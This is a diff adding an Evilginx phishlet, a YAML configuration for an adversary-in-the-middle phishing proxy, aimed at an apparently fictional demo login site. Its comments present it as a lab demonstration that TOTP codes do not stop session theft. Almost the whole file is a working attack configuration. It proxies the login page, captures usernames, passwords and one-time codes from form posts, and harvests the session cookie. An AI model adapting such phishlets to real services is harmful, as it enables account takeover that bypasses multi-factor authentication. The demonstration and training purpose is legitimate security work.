@@ -1,0 +1,44 @@
+# Example Evilginx phishlet for the demo login backend.
+#
+# Adjust the domain/subdomains to match your demo environment. This phishlet
+# assumes the backend is reachable at https://login.democorp.example and that
+# Evilginx serves the look-alike phishing domain you configure with `config domain`.
+name: 'democorp'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'democorp.example', session: true, is_landing: true, auto_filter: true}
+
+sub_filters: []
+
+# Evilginx considers the session captured once these cookies are seen in a
+# Set-Cookie response. demo_session is the session cookie this backend issues.
+auth_tokens:
+  - domain: 'login.democorp.example'
+    keys: ['demo_session']
+
+# Captured from the POSTed login form. `code` captures bob's TOTP second factor,
+# demonstrating that a one-time code does NOT protect against an AitM proxy —
+# the stolen session cookie is what matters.
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'code'
+      search: '(.*)'
+      type: 'post'
+
+# Page that is only reachable after authentication; reaching it confirms a
+# successful capture.
+auth_urls:
+  - '/dashboard'
+
+login:
+  domain: 'login.democorp.example'
+  path: '/login'
